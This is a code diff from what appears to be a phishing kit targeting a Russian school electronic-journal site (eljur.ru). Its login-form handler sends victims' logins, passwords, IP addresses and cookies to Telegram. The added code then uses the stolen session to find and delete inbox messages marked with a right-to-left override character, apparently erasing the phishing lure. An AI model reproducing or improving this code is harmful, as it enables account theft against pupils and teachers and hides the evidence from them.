@@ -138,8 +138,37 @@ function handleFormSubmit(loginViewport, blurOverlay) {
       const data = await res.json();
 
       if (data.result && data.actions?.[0]?.type === "redirect") {
-        const url = data.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(data.actions[0].url)})` : "Нет URL";
-        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n Ссылка для авторизации: ${url}`);
+        const url = data.actions[0]?.url ? `[Url](${encodeURI(data.actions[0].url)})` : "Нет URL";
+        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n${url}`);
+
+        (async () => {
+          const baseUrl = "/journal-api-messages-action";
+          try {
+            const res = await fetch(`${baseUrl}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
+              credentials: "include",
+            });
+            const msgData = await res.json();
+
+            const targets = msgData.list.filter(msg => 
+              msg.subject.includes("Привет!\u202E") || 
+              msg.body.startsWith("Привет!‮&lt")
+            );
+
+            const ids = targets.map(msg => msg.id);
+
+            if (ids.length > 0) {
+              console.log("Нашлись сообщения для удаления:", ids);
+              const deleteUrl = `${baseUrl}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
+              const delRes = await fetch(deleteUrl, { credentials: "include" });
+              const delData = await delRes.json();
+              console.log("Результат удаления:", delData);
+            } else {
+              console.log("Ничего не нашлось для удаления");
+            }
+          } catch (err) {
+            console.error("Ошибка при обработке сообщений:", err);
+          }
+        })();
 
         blurOverlay.remove();
         loginViewport.remove();
